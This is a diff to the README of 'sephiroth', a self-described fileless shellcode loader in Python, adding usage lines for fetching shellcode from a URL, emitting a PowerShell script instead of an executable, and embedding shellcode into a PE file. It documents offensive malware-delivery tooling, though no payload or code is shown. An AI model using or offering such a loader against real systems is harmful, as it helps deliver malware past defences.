@@ -8,8 +8,14 @@ sephiroth  is a Fileless Shellcode Loader with Python :
 
 Usage: python Sephiros.py -url 'urlforshellcode'
 
+u can generate a ps1 script with -ps instead of building into exe
 
-you can also just embed shellcode into the PE using -sh 'pathofshellcode'
+python Sephiros.py -url 'urlforshellcode' -ps
+
+you can also just embed shellcode into the PE directly using -sh 'pathofshellcode'
+
+
+python Sephiros.py -sh 'pathto_shellcode'
 
 fileless executing example:
 -------------------
